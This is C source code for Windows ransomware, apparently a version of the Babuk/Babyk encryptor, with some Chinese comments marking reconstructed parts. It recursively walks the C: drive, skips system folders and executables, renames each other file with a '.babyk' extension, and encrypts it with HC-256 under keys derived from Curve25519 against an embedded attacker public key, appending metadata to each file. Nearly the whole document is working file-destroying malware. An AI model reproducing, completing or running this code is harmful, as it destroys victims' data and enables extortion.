#include <windows.h>

#include "hash/crc32.h"
#include "hash/sha512.h"
#include "eSTREAM/ecrypt-sync.h"
#include "ecc/curve25519-donna.h"

#include "memory.h"
#include "debug.h"

static const WCHAR* black[] = {
    0, L"AppData", L"Boot", L"Windows", L"Windows.old",
    L"Tor Browser", L"Internet Explorer", L"Google", L"Opera",
    L"Opera Software", L"Mozilla", L"Mozilla Firefox", L"$Recycle.Bin",
    L"ProgramData", L"All Users", L"autorun.inf", L"boot.ini", L"bootfont.bin",
    L"bootsect.bak", L"bootmgr", L"bootmgr.efi", L"bootmgfw.efi", L"desktop.ini",
    L"iconcache.db", L"ntldr", L"ntuser.dat", L"ntuser.dat.log", L"ntuser.ini", L"thumbs.db",
    L"Program Files", L"Program Files (x86)", L"#recycle", L"..", L"."
};

static BYTE m_publ[32] = {
        'c',  'u',  'r',  'v',  'p',  'a',  't',  't',  'e',  'r',
        'n',  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00
};

static BOOL debug_mode = 0;

static HCRYPTPROV hProv = 0;

#define CONST_BLOCK_PLUS 0x100000
#define CONST_BLOCK_MINUS -CONST_BLOCK_PLUS

#define CONST_LARGE_FILE 0x1400000
#define CONST_MEDIUM_FILE 0x500000

struct BABUK_KEYS {
    BYTE               hc256_key[32];
    BYTE               hc256_vec[32];
};

struct BABUK_SESSION {
    BYTE       curve25519_shared[32];
    BYTE      curve25519_private[32];
};

struct BABUK_FILEMETA {
    BYTE          curve25519_pub[32];
    DWORD                xcrc32_hash;
    LONGLONG                   flag1;
    LONGLONG                   flag2;
    LONGLONG                   flag3;
    LONGLONG                   flag4;
};

void _encrypt_file(WCHAR* filePath) {
    const uint8_t basepoint[32] = { 9 };

    BOOL tryToUnlock = TRUE;
    LARGE_INTEGER fileSize;
    LARGE_INTEGER fileOffset;
    LARGE_INTEGER fileChunks;

    ECRYPT_ctx ctx;

    BABUK_KEYS babuk_keys;
    BABUK_SESSION babuk_session;
    BABUK_FILEMETA babuk_meta;
    babuk_meta.flag1 = 0x6420676e756f6863;
    babuk_meta.flag2 = 0x6b6f6f6c20676e6f;
    babuk_meta.flag3 = 0x6820656b696c2073;
    babuk_meta.flag4 = 0x2121676f6420746f;

    SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL);

    if (WCHAR* newName = (WCHAR*)_halloc((lstrlenW(filePath) + 7) * sizeof(WCHAR))) {
        lstrcpyW(newName, filePath);
        lstrcatW(newName, L".babyk");

        if (MoveFileExW(filePath, newName, MOVEFILE_WRITE_THROUGH | MOVEFILE_REPLACE_EXISTING) != 0) {
        retry:;
            HANDLE hFile = CreateFileW(newName, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0);
            _hfree(newName);

            DWORD dwRead;
            DWORD dwWrite;
            if (hFile != INVALID_HANDLE_VALUE) {
                GetFileSizeEx(hFile, &fileSize);
                if (BYTE* ioBuffer = (BYTE*)_halloc(CONST_BLOCK_PLUS)) {
                    CryptGenRandom(hProv, 32, babuk_session.curve25519_private);
                    babuk_session.curve25519_private[0] &= 248;
                    babuk_session.curve25519_private[31] &= 127;
                    babuk_session.curve25519_private[31] |= 64;
                    curve25519_donna(babuk_meta.curve25519_pub, babuk_session.curve25519_private, basepoint);
                    curve25519_donna(babuk_session.curve25519_shared, babuk_session.curve25519_private, m_publ);

                    SHA512_Simple(babuk_session.curve25519_shared, 32, (BYTE*)&babuk_keys);
                    ECRYPT_keysetup(&ctx, babuk_keys.hc256_key, 256, 256);
                    ECRYPT_ivsetup(&ctx, babuk_keys.hc256_vec);

                    babuk_meta.xcrc32_hash = xcrc32((BYTE*)&babuk_keys, sizeof(BABUK_KEYS));
                    _memset((BYTE*)&ctx.key[0], 0, 16 * sizeof(uint32_t));
                    _memset((BYTE*)&babuk_keys, 0, sizeof(BABUK_KEYS));
                    _memset((BYTE*)&babuk_session, 0, sizeof(BABUK_SESSION));

                    fileOffset.QuadPart = 0;
                    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                    if (fileSize.QuadPart > CONST_LARGE_FILE) {
                        fileChunks.QuadPart = fileSize.QuadPart / 0xA00000i64;
                        for (LONGLONG i = 0; i < fileChunks.QuadPart; i++) {
                            ReadFile(hFile, ioBuffer, CONST_BLOCK_PLUS, &dwRead, 0);
                            ECRYPT_process_bytes(0, &ctx, ioBuffer, ioBuffer, dwRead);
                            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                            WriteFile(hFile, ioBuffer, CONST_BLOCK_PLUS, &dwWrite, 0);

                            fileOffset.QuadPart += 0xA00000i64;
                            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                        }
                    }
                    else if (fileSize.QuadPart > CONST_MEDIUM_FILE) {
                        LONGLONG jump = fileSize.QuadPart / 3;

                        for (LONGLONG i = 0; i < 3; i++) {
                            ReadFile(hFile, ioBuffer, CONST_BLOCK_PLUS, &dwRead, 0);
                            ECRYPT_process_bytes(0, &ctx, ioBuffer, ioBuffer, dwRead);
                            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                            WriteFile(hFile, ioBuffer, dwRead, &dwWrite, 0);

                            fileOffset.QuadPart += jump;
                            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                        }
                    }
                    else {
                        // 小文件全加密 (假设截断部分)
                        ReadFile(hFile, ioBuffer, fileSize.LowPart, &dwRead, 0);
                        ECRYPT_process_bytes(0, &ctx, ioBuffer, ioBuffer, dwRead);
                        SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                        WriteFile(hFile, ioBuffer, dwRead, &dwWrite, 0);
                    }

                    // 追加元数据 (假设截断部分)
                    fileOffset.QuadPart = fileSize.QuadPart;
                    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                    WriteFile(hFile, &babuk_meta, sizeof(BABUK_FILEMETA), &dwWrite, 0);

                    SetEndOfFile(hFile);
                    _hfree(ioBuffer);
                    CloseHandle(hFile);
                }
            }
            else if (debug_mode) {
                int size_needed = WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), NULL, 0, NULL, NULL);
                char* strTo = (char*)_halloc(size_needed);
                WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), strTo, size_needed, NULL, NULL);

                _dbg_report("Can't open file after killHolder", strTo, GetLastError());

                _hfree(strTo);
            }
        }
        else if (debug_mode) {
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), NULL, 0, NULL, NULL);
            char* strTo = (char*)_halloc(size_needed);
            WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), strTo, size_needed, NULL, NULL);

            _dbg_report("Can't MoveFileExW", strTo, GetLastError());

            _hfree(strTo);
        }
    }
}

void find_files_recursive(LPCWSTR dirPath)
{
    if (WCHAR* localDir = (WCHAR*)_halloc(32768 * sizeof(WCHAR)))
    {
        WIN32_FIND_DATAW fd;
        lstrcpyW(localDir, dirPath);
        lstrcatW(localDir, L"\\*");

        HANDLE hIter = FindFirstFileW(localDir, &fd);
        if (hIter != INVALID_HANDLE_VALUE)
        {
            do
            {
                for (DWORD i = 0; i < _countof(black); ++i) {
                    if (!lstrcmpiW(fd.cFileName, black[i])) {
                        goto skip;
                    }
                }

                lstrcpyW(localDir, dirPath);
                lstrcatW(localDir, L"\\");
                lstrcatW(localDir, fd.cFileName);

                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                {
                    for (int i = lstrlenW(fd.cFileName) - 1; i >= 0; i--) {
                        if (fd.cFileName[i] == L'.') {
                            if (
                                lstrcmpiW(fd.cFileName + i, L".exe") == 0
                                ||
                                lstrcmpiW(fd.cFileName + i, L".dll") == 0
                                ||
                                lstrcmpiW(fd.cFileName + i, L".babyk") == 0
                                ) {
                                goto skip;
                            }
                            else break;
                        }
                    }

                    _encrypt_file(localDir);
                }
            skip:;
            } while (FindNextFileW(hIter, &fd));
            FindClose(hIter);
        }
        _hfree(localDir);
    }
}

void entry() {
    ECRYPT_init();
    _mem_initialize();

    if (hProv = gen_context()) {
        // 示例调用
        find_files_recursive(L"C:\\");
        CryptReleaseContext(hProv, 0);
    }

    ExitProcess(0);
}